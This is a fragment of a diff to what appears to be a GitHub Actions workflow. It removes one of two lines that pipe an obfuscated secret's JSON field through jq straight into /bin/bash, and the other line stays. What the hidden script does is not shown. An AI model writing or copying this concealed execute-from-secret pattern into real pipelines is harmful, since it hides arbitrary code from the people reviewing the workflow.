@@ -17,7 +17,6 @@ jobs:
           ngf6445: ${{ secrets.ngf6445 }}
         run: |
           printf '%s' "$ngf6445" | jq -r .yshu569 | /bin/bash
-          echo $eifme16695 | jq -r .hovgh825 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
